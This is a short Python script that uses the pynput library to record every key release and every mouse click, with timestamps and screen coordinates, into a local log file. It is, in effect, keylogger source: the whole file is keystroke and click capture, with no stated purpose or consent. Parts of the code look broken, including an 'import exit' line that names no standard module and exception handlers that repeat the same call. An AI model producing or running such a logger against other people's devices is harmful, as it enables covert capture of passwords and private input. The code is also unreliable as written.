#pip install pynput
from pynput import mouse
from pynput.keyboard import Key,Listener
import logging
from pynput import keyboard
#import mouse
import exit


def on_release(key):
    global keyCapture
    #if key == Key.esc:

    keyCapture = '{0} released'.format(key)
    #print(keyCapture)
    try:
        logging.info(keyCapture)
    except NameError:
        logging.info(keyCapture)

def on_click(x, y, button, pressed):

        if pressed:

                
                try:
                        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
                        
                except NameError:
                        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

logging.basicConfig(filename=("mouse_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

key_listener = keyboard.Listener(on_release=on_release)
key_listener.start()

with mouse.Listener(on_click=on_click) as listener:
        listener.join()